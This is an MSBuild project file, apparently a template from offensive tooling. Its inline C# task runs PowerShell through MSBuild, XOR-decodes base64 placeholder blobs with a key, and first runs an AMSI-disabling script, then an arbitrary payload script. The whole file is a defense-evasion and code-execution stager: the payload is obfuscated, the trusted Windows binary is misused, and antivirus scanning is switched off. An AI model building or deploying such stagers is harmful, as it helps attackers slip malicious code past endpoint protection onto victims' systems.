<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="x">
   <n/>
  </Target>
  <UsingTask
    TaskName="n"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
  <Task>
    <Reference Include="System.Management.Automation"/>
      <Code Type="Class" Language="cs">
        <![CDATA[
			using System;
			using System.Text;
			using System.Collections.ObjectModel;
			using System.Management.Automation;
			using System.Management.Automation.Runspaces;
			using Microsoft.Build.Framework;
			using Microsoft.Build.Utilities;

			public class n: Task, ITask
			{
				public override bool Execute()
				{
					string ampsee = "~~AMSI~~";
					string cmnd = "~~SCRIPT~~";
					string key = "~~KEY~~";

					PowerShell p = PowerShell.Create();
					p.AddScript(System.Text.Encoding.UTF8.GetString(Zor(Convert.FromBase64String(ampsee), Encoding.UTF8.GetBytes(key))));
					p.Invoke();

					p.AddScript(System.Text.Encoding.UTF8.GetString(Zor(Convert.FromBase64String(cmnd), Encoding.UTF8.GetBytes(key))));
					Collection<PSObject> output = null;
					output = p.Invoke();

					try
					{
						foreach (PSObject rtnItem in output)
						{
							Console.WriteLine(rtnItem.ToString());
						}
					}
					catch(Exception e){}
					return true;
				}
				private static byte[] Zor(byte[] input, byte[] key)
				{
					byte[] mixed = new byte[input.Length];
					for (int i = 0; i < input.Length; i++)
					{
						mixed[i] = (byte)(input[i] ^ key[i % key.Length]);
					}
					return mixed;
				}
			}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

